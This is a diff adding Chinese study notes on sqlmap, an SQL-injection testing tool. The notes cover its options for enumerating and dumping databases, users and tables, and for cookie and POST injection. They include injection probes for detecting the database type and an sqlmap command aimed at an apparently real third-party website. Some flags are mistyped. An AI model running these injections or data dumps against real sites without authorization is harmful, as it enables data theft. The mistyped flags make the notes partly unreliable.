@@ -1,0 +1,96 @@
+sqlmap：python编写的开源渗透测试工具，主要检测sql注入漏洞，漏洞利用工具
+	适用于 sql盲注，union联合查询，显错注入，延迟注入，post注入，cookie注入等
+	执行命令，列举用户，检查权限，数据导出
+	基本参数
+		-h	
+		--is-dba   当前用户权限
+		--dbs       当前用户
+		--current-db    连接的是那一个数据库
+		--tables 列表名
+		--columns 列字段名
+		--dump 下载数据
+		--dump-all 转存DBMS数据库所有表项目
+		--level 测试等级
+		-D manage 指定数据库
+		-T 指定表
+		-C指定列
+		--dbms=mysql oracle msql 指定数据库
+		--users枚举所有用户
+		--schema--batch-- excludes-sysdbs：列举数据库系统架构
+		--level 3 （默认1）
+	显示调试信息
+		-v 有7个级别
+			0 只显示python错误以及严重信息
+			1同时显示基本信息和警告信息
+			2显示debug信息
+			3显示注入的payload
+			4显示http请求
+			5显示http相应头
+·			5http响应页面
+	风险等级
+		1会测试大部分的测试语句
+
+·	测试多个目标
+		保存在一个txt里面，
+		sqlmap.py -m 
+
+	http注入请求：post注入，搜索注入，http头，登陆后的注入点
+
+
+	--data：此参数以post提交时，用改参数 提交参数
+	sqlmap.py -u "url/login.php" --data "post提交的参数"
+
+	--param-del，当url参数不是&连接时，sqlmap无法识别参数，可以通过--param-del=“；”
+
+	--cookie 适合cookie注入
+	sqlmap.py -u "url/login.php" -cookie 'id=9' --table--level2
+
+	--referer 
+		sqlmap 可以在请求
+
+	时间控制：
+	--delay
+	--timeout
+	--retries
+
+伪静态：
+	
+
+批量检测站点
+	1通常用于某一类型漏洞站点的安全检测
+	判断数据库类型：	  
+	--->@@操作1：       access: link + and exsits(select * from msysobjects)>0 
+			mssql: link + and exsits(select * from sysobjects)>0 
+	
+	
+	sql注入扫描工具：穿山甲   sqlmap
+		--->@@操作1：sqlmap -u http://www.rayseasc.com/plugin.php?id=ruixi:index
+	
+	
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		
+
+
+	
